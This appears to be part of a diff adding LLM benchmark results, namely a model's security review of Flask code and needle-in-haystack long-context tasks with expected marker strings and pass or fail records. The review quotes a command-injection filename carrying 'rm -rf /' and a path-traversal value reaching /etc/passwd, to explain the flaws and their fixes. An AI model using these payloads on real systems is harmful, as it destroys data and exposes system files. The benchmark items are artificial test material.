+            "response_excerpt": "As an application security reviewer, I have analyzed the provided Flask code. This snippet contains several **critical** security vulnerabilities that could lead to full server compromise.\n\nHere is the breakdown of the findings:\n\n### 1. OS Command Injection (Critical)\n**Vulnerability:** The application takes the `filename` parameter directly from the user request and interpolates it into a shell command string. Because `shell=True` is used, an attacker can use shell metacharacters (like `;`, `&`, `|`, or `` ` ``) to execute arbitrary commands on the host operating system.\n\n*   **Example Attack:** If a user sends `filename` as:\n    `file.docx; rm -rf /;`\n    The executed command becomes:\n    `libreoffice --headless --convert-to pdf --outdir /tmp/converted /tmp/uploads/file.docx; rm -rf /;`\n*   **Impact:** Remote Code Execution (RCE). The attacker can steal data, install malware, or take over the server.\n\n**How to Fix:**\n1.  **Avoid `shell=True`:** Pass the command as a list of arguments. This prevents the shell from interpreting metacharacters.\n2.  **Use `shlex.quote`:** If you must use a string, ensure all inputs are properly escaped.\n3.  **Validate Input:** Ensure the filename contains only alphanumeric characters and a single extension.\n\n---\n\n### 2. Path Traversal (High)\n**Vulnerability:** The code trusts the `filename` provided by the user to construct a file path (`/tmp/uploads/{filename}`). An attacker can use \"dot-dot-slash\" sequences to access files outside of the intended directory.\n\n*   **Example Attack:** If a user sends `filename` as:\n    `../../etc/passwd`\n    The application will attempt to process `/tmp/uploads/../../etc/passwd`, which resolves to `/etc/passwd`.\n*   **Impact:** Unauthorized file read/access and potential information disclosure.\n\n**How to Fix:**\n1.  **Use `werkzeug.utils.secure_filename`:** This is the standard way in Flask to sanitize filenames.\n2.  **Hardcode the Base Path:** Do not rely on the user to provide the path; only let them ... [truncated]"
+          }
+        }
+      ],
+      "artifact_count": 8,
+      "logs": []
+    },
+    {
+      "category": "long-context",
+      "n_pass": 7,
+      "n_total": 10,
+      "wall_s": 312.5850086212158,
+      "returncode": 1,
+      "timed_out": false,
+      "tasks": [
+        {
+          "id": "01-8k-pos10",
+          "passed": true,
+          "elapsed_s": 10.1,
+          "reasons": [],
+          "artifact": {
+            "task_id": "01-8k-pos10",
+            "category": "long-context",
+            "expected_marker": "XK-1001-ALFA-9273-NEEDLE",
+            "target_tokens": 8000,
+            "position_pct": 0.1,
+            "response_length": 538,
+            "response_excerpt": "XK-1001-ALFA-9273-NEEDLE\nThe codebase consists of multiple redundant, sharded implementations of core services (job scheduling, inventory, payments, etc.), which suggests a manual sharding strategy that is difficult to maintain. Several components exhibit thread-safety risks, such as the non-atomic dictionary access in `_get_lock` and the lack of thread-safe iteration in the search index. Additionally, the `AuditLog` and `EventBus` classes lack proper flushing or error handling mechanisms for high-throughput production environments.",
+            "first_line": "XK-1001-ALFA-9273-NEEDLE"
+          }
+        },
+        {
+          "id": "02-8k-pos50",
+          "passed": true,
+          "elapsed_s": 9.9,
+          "reasons": [],
+          "artifact": {
+            "task_id": "02-8k-pos50",
+            "category": "long-context",
+            "expected_marker": "XK-1002-BRAVO-4418-NEEDLE",
+            "target_tokens": 8000,
+            "position_pct": 0.5,
+            "response_length": 478,
+            "response_excerpt": "XK-1002-BRAVO-4418-NEEDLE\nThe codebase consists of multiple redundant shards of core services (job scheduling, inventory, payments, etc.), which suggests a manual horizontal scaling approach but introduces significant maintenance overhead. Key issues include potential race conditions in `_get_lock` methods (non-atomic check-then-set), lack of persistence in the `AuditLog` and `CacheLayer` classes, and a lack of thread-safe iteration in the `SearchIndexWriter` search method.",
+            "first_line": "XK-1002-BRAVO-4418-NEEDLE"
+          }
+        },
+        {
+          "id": "03-8k-pos90",
+          "passed": true,
+          "elapsed_s": 9.7,
+          "reasons": [],
+          "artifact": {
+            "task_id": "03-8k-pos90",
+            "category": "long-context",
+            "expected_marker": "XK-1003-CHARLIE-8801-NEEDLE",
+            "target_tokens": 8000,
+            "position_pct": 0.9,
+            "response_length": 579,
+            "response_excerpt": "XK-1003-CHARLIE-8801-NEEDLE\nThe codebase consists of multiple redundant, sharded implementations of core services (inventory, scheduling, rate limiting, etc.), which suggests a manual sharding strategy that could be simplified with a unified interface. Several modules exhibit thread-safety risks, such as the `_get_lock` method in inventory services which is not atomic, and the `EventBus` which lacks thread-safe iteration over subscribers. Additionally, the `SearchIndexWriter` lacks any locking mechanisms, making it unsafe for concurrent use in a multi-threaded environment.",
+            "first_line": "XK-1003-CHARLIE-8801-NEEDLE"
+          }
+        },
+        {
+          "id": "04-64k-pos10",
+          "passed": true,
+          "elapsed_s": 68.5,
+          "reasons": [],
+          "artifact": {
+            "task_id": "04-64k-pos10",
+            "category": "long-context",
+            "expected_marker": "XK-2001-DELTA-5567-NEEDLE",
+            "target_tokens": 64000,
+            "position_pct": 0.1,
+            "response_length": 426,
+            "response_excerpt": "XK-2001-DELTA-5567-NEEDLE\nThe codebase consists of a highly redundant, sharded architecture where nearly identical logic for job scheduling, inventory, and rate limiting is duplicated across hundreds of files. While the individual components use thread-safe primitives (like `threading.Lock`), the lack of a centralized shared state across these shards would lead to significant data inconsistency in a production environment.",
+            "first_line": "XK-2001-DELTA-5567-NEEDLE"
+          }
+        },
+        {
+          "id": "05-64k-pos50",
+          "passed": true,
+          "elapsed_s": 67.1,
+          "reasons": [],
+          "artifact": {
+            "task_id": "05-64k-pos50",
+            "category": "long-context",
+            "expected_marker": "XK-2002-ECHO-3392-NEEDLE",
+            "target_tokens": 64000,
+            "position_pct": 0.5,
+            "response_length": 463,
+            "response_excerpt": "XK-2002-ECHO-3392-NEEDLE\nThe codebase consists of a highly redundant, sharded architecture where nearly identical logic for job scheduling, inventory management, and rate limiting is duplicated across hundreds of files. While the use of thread locks provides basic concurrency safety, the lack of a centralized state management system and the manual duplication of logic across shards present significant maintenance risks and potential for inconsistent behavior.",
+            "first_line": "XK-2002-ECHO-3392-NEEDLE"
+          }
+        },
+        {
+          "id": "06-64k-pos90",
+          "passed": true,
+          "elapsed_s": 72.4,
+          "reasons": [],
+          "artifact": {
+            "task_id": "06-64k-pos90",
+            "category": "long-context",
+            "expected_marker": "XK-2003-FOXTROT-7714-NEEDLE",
+            "target_tokens": 64000,
+            "position_pct": 0.9,
+            "response_length": 467,
+            "response_excerpt": "XK-2003-FOXTROT-7714-NEEDLE\nThe codebase consists of a highly redundant, sharded architecture where nearly identical logic is duplicated across hundreds of files (e.g., `job_scheduler_v0` through `v300`). While the individual components use thread-safe primitives like `threading.Lock`, the lack of a centralized configuration or shared logic makes the system extremely difficult to maintain and prone to \"drift\" where one shard might behave differently than another.",
+            "first_line": "XK-2003-FOXTROT-7714-NEEDLE"
+          }
+        },
+        {
+          "id": "07-150k-pos10",
+          "passed": false,
+          "elapsed_s": 0.3,
+          "reasons": [
+            "request failed: 400 Client Error: Bad Request for url: http://192.168.0.73:8012/v1/chat/completions"
+          ],
+          "artifact": {
+            "task_id": "07-150k-pos10",
+            "category": "long-context",
+            "expected_marker": "XK-3001-GOLF-2256-NEEDLE",
+            "target_tokens": 150000,
+            "position_pct": 0.1,
+            "error": "request failed: 400 Client Error: Bad Request for url: http://192.168.0.73:8012/v1/chat/completions"
+          }
+        },
+        {
+          "id": "08-150k-pos50",
+          "passed": false,
+          "elapsed_s": 0.3,
+          "reasons": [
+            "request failed: 400 Client Error: Bad Request for url: http://192.168.0.73:8012/v1/chat/completions"
+          ],
+          "artifact": {
+            "task_id": "08-150k-pos50",
+            "category": "long-context",
+            "expected_marker": "XK-3002-HOTEL-9938-NEEDLE",
+            "target_tokens": 150000,
+            "position_pct": 0.5,
+            "error": "request failed: 400 Client Error: Bad Request for url: http://192.168.0.73:8012/v1/chat/completions"
+          }
+        },
+        {
+          "id": "09-distractor-64k",
+          "passed": true,
+          "elapsed_s": 73.4,
+          "reasons": [],
+          "artifact": {
+            "task_id": "09-distractor-64k",
+            "category": "long-context",
+            "expected_marker": "XK-4001-INDIA-6625-REAL",
+            "target_tokens": 64000,
+            "position_pct": 0.5,
+            "response_length": 417,
+            "response_excerpt": "XK-4001-INDIA-6625-REAL\n\nThe codebase consists of highly redundant, sharded service modules (e.g., `inventory_service_v1` through `v301`) that replicate the same logic across hundreds of files. While the individual components use thread-safe primitives like `threading.Lock`, the architecture suffers from extreme code duplication and a lack of centralized configuration, making maintenance and scalability difficult.",
+            "first_line": "XK-4001-INDIA-6625-REAL"
+          }
+        },
+        {
+          "id": "10-distractor-150k",
+          "passed": false,
+          "elapsed_s": 0.3,
+          "reasons": [
+            "request failed: 400 Client Error: Bad Request for url: http://192.168.0.73:8012/v1/chat/completions"
+          ],
+          "artifact": {
+            "task_id": "10-distractor-150k",
+            "category": "long-context",
+            "expected_marker": "XK-4002-JULIET-1187-REAL",
+            "target_tokens": 150000,
+            "position_pct": 0.75,
+            "error": "request failed: 400 Client Error: Bad Request for url: http://192.168.0.73:8012/v1/chat/completions"
+          }
+        }
+      ],
+      "artifact_count": 10,
+      "logs": []
+    }
+  ]
+}
